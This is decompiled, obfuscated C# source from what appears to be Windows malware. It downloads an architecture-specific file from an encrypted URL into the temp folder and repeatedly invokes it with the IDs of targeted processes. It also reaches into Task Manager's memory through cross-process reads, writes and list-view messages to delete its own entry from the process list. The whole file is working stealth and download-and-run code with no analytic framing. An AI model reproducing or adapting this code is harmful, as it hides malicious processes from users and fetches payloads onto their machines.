using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bfaErnBXmrcm;

internal sealed class ckRGywYNlb
{
	private struct SivfUdNnjMqTdJv
	{
		public uint DbyuptmrsegZwp;

		public IntPtr kQuUFtciHw;

		public IntPtr xLJKUbHziTepHVp;

		public uint ocziNBgQOJOTBXB;

		public uint PpPCVrOjkfNRAcPE;

		public IntPtr ADjdFIKXHgt;

		public uint KYBjbMKHmWnaOka;

		public int EBPSJAZNrQPXV;

		public IntPtr cTNrzPjFFSqn;
	}

	private static volatile bool dQdOekoAIHHZyyPi;

	public static volatile bool QrxpuwfwQAQWuYX;

	[NonSerialized]
	internal static GetString getString_0;

	public static string hYrcVuQewj()
	{
		if (IntPtr.Size == 8)
		{
			XPQlliQqqoVcs.zYWbPYhBdBqMxQ = KwOOFpkTIlm(new Uri(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367732))));
		}
		else
		{
			XPQlliQqqoVcs.zYWbPYhBdBqMxQ = KwOOFpkTIlm(new Uri(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107368066))));
		}
		return XPQlliQqqoVcs.zYWbPYhBdBqMxQ;
	}

	public static string KwOOFpkTIlm(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107370363), getString_0(107361210)).Remove(0, 3) + getString_0(107370358);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process nzNHQuihJeUut(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void iwIiOgnXzUZHZ(string[] string_0)
	{
		string text = hYrcVuQewj();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = nzNHQuihJeUut(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					XPQlliQqqoVcs.RtUOSMEWlIYOZ(text, text2 + getString_0(107359602) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					XPQlliQqqoVcs.RtUOSMEWlIYOZ(text, text2 + getString_0(107359602) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107367952));
					XPQlliQqqoVcs.RtUOSMEWlIYOZ(text, text2 + getString_0(107359602) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367911)));
					XPQlliQqqoVcs.RtUOSMEWlIYOZ(text, text2 + getString_0(107359602) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107358346)));
					XPQlliQqqoVcs.RtUOSMEWlIYOZ(text, text2 + getString_0(107359602) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367918)));
					XPQlliQqqoVcs.RtUOSMEWlIYOZ(text, text2 + getString_0(107359602) + XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107367869)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr ZDSWNwRdqTM);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr pIFkogEeeu, IntPtr nyvNqiicyxmObMJi, byte[] VbNOTmINSWJLm, uint LxadNGEKnna, out UIntPtr yUzZeQxGoa);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr SebPjMAXxmG, IntPtr XGyTfSvyezBHyV, [Out] byte[] biCVJoZuNSLHkg, int HGejWHKuNXC, out UIntPtr aUHlZJdkVxVy);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr ZUBWzGFWwslHx, out uint EKOwkiUBhJ);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] tDwHTICgdTCaPA(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr vczdbQwKSRYZQwN(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void ZrbZukUdUQ(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr EPcBwdXiVsF(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void oLJmlNHhitUG(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr wSVCHoKgGGywxT()
	{
		IntPtr intPtr = FindWindow(getString_0(107367884), getString_0(107367347));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107367314), getString_0(107367273));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367314), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367288), getString_0(107367235));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367314), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367288), getString_0(107367254));
	}

	private static IntPtr BhThCPTBGWDPAU(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void YeGKrfcwGnqEgt(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void lmHqGhZTyqMHB(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string jVmsxbblnyFFU(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		SivfUdNnjMqTdJv sivfUdNnjMqTdJv = default(SivfUdNnjMqTdJv);
		GetWindowThreadProcessId(intptr_0, out var EKOwkiUBhJ);
		IntPtr intPtr = vczdbQwKSRYZQwN(EKOwkiUBhJ);
		IntPtr intPtr2 = EPcBwdXiVsF((uint)Marshal.SizeOf(sivfUdNnjMqTdJv), intPtr);
		IntPtr intPtr3 = EPcBwdXiVsF(50u, intPtr);
		sivfUdNnjMqTdJv.kQuUFtciHw = intptr_1;
		sivfUdNnjMqTdJv.xLJKUbHziTepHVp = (IntPtr)0;
		sivfUdNnjMqTdJv.KYBjbMKHmWnaOka = 50u;
		sivfUdNnjMqTdJv.ADjdFIKXHgt = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, tDwHTICgdTCaPA(sivfUdNnjMqTdJv), (uint)Marshal.SizeOf(sivfUdNnjMqTdJv), out var yUzZeQxGoa);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out yUzZeQxGoa);
		oLJmlNHhitUG(intPtr, intPtr2, (uint)Marshal.SizeOf(sivfUdNnjMqTdJv));
		oLJmlNHhitUG(intPtr, intPtr3, 50u);
		ZrbZukUdUQ(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void SZdoLqEhtnqZms(string string_0)
	{
		IntPtr intPtr = wSVCHoKgGGywxT();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)BhThCPTBGWDPAU(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = jVmsxbblnyFFU(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				YeGKrfcwGnqEgt(intPtr, (IntPtr)i);
			}
		}
	}

	private static void wieLeiZkmLLkjOV()
	{
		IntPtr intPtr = wSVCHoKgGGywxT();
		if (intPtr != IntPtr.Zero)
		{
			lmHqGhZTyqMHB(intPtr);
			lmHqGhZTyqMHB(intPtr);
			lmHqGhZTyqMHB(intPtr);
			lmHqGhZTyqMHB(intPtr);
			lmHqGhZTyqMHB(intPtr);
		}
	}

	public static void zYCRcguBLRkf()
	{
		Thread thread = new Thread(lFsEnQqGuFYiRT);
		thread.Start();
	}

	private static void lFsEnQqGuFYiRT()
	{
		while (!dQdOekoAIHHZyyPi)
		{
			if (QrxpuwfwQAQWuYX)
			{
				SZdoLqEhtnqZms(Process.GetCurrentProcess().ProcessName + getString_0(107370358));
				Thread.Sleep(525);
			}
			else
			{
				wieLeiZkmLLkjOV();
				Thread.Sleep(1000);
			}
		}
		dQdOekoAIHHZyyPi = false;
	}

	static ckRGywYNlb()
	{
		Strings.CreateGetStringDelegate(typeof(ckRGywYNlb));
		dQdOekoAIHHZyyPi = false;
		QrxpuwfwQAQWuYX = true;
	}
}
